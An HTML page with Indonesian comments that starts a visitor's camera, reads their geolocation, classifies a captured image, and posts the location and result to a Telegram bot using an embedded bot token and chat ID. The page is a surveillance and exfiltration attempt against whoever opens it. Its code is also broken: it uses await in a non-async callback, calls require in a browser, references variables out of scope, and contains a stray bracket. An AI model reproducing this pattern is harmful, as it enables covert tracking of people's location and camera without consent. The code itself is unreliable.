<!DOCTYPE html>
<html>
<head>
    <title>Mendapatkan Lokasi dan Kamera Depan</title>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.13.0"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/mobilenet@1.1.0/dist/mobilenet.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/camera@0.12.0/dist/camera.min.js"></script>
</head>
<body>
    <h1>Mendapatkan Lokasi dan Kamera Depan</h1>
    <div id="camera-container"></div>
    <script>
        // Inisialisasi kamera
        const camera = new Camera();
        camera.startStream(() => {
            // Mendapatkan lokasi
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                console.log(`Lokasi: ${lat}, ${lng}`);
            });

            // Mendapatkan kamera depan
            const video = document.getElementById('camera-container');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = 640;
            canvas.height = 480;

            video.appendChild(canvas);

            camera.takePicture(() => {
                const img = camera.getImage();
                const prediction = await mobilenet.classify(img);
                console.log(`Prediksi: ${prediction[0].className}`);
            });

            // Mengirim data ke telebot
            const axios = require('axios');
            axios.post('https://api.telegram.org/bot[8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0]/sendMessage', {
                chat_id: 1966317946],
                text: `Lokasi: ${lat}, ${lng}\nPrediksi: ${prediction[0].className}`
            })
            .then(response => {
                console.log(response.data);
            })
            .catch(error => {
                console.error(error);
            });
        });
    </script>
</body>
</html>
